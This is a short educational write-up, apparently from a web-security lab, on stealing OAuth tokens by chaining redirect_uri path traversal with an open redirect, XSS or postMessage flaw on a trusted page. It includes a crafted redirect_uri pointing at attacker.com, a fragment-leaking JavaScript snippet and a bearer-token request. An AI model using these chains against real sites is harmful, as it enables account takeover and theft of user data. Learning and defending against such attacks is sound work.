Proxy Page Attack

[ FEYNMAN-STYLE EXPLANATION ]

0x01: The Setup

Sometimes the OAuth server is well protected:

  • It only allows redirect_uri to trusted domains.
  • You can’t directly send tokens to your own server.

👉 Direct attack fails.

0x02: The Proxy Concept

Instead of sending the token to your server directly:

  • Send it to a trusted page inside the target site.
  • That page has a vulnerability that leaks or forwards the token to you.

👉 Trusted site becomes a middleman.

0x03: Chain of Exploitation

How it works (step-by-step):

Step A: Control part of redirect_uri to point to /../some-page.

Step B: Locate a bug on that page (Open Redirect, XSS, or Insecure postMessage).

Step C: OAuth sends token to the trusted page, which leaks it to the attacker.

0x04: The Analogy

A secure delivery system refuses to deliver packages to strangers (attackers). It only delivers to trusted buildings.

The Hack: Attacker sends the package to a trusted building where a broken receptionist (vulnerable page) forwards it to the attacker.

👉 System secure, internal building compromised.

0x05: Real-World Lab Example

  • Traversal: redirect_uri = /callback/../post
  • Discovery: /post/next?path=URL (Open Redirect)
  • Final Chain: redirect_uri = /callback/../post/next?path=attacker.com
OAuth -> /post/next /post/next -> redirects -> attacker Token (#access_token=XYZ) arrives at attacker

0x06: Advanced Exfiltration Techniques

Via JS Fragment:

<script> window.location = '/?' + document.location.hash.substr(1) </script>

Via postMessage Proxy:

Vulnerable page uses postMessage(*) to send full URL (including token) to any listening frame (attacker site).

0x07: Root Issue

  • Whitelists prevent external redirects but allow internal vulnerable pages.
  • Token exposed in browser (Implicit Flow).
  • Trusting internal pages blindly.

0x08: Impact

Stolen token used via:

GET /me Authorization: Bearer XYZ

Result: Attacker extracts user data and API keys.

ONE-LINE TAKEAWAY: Even with strict domain whitelisting, attackers can chain internal vulnerabilities to turn trusted pages into proxies, leaking OAuth tokens and compromising accounts.
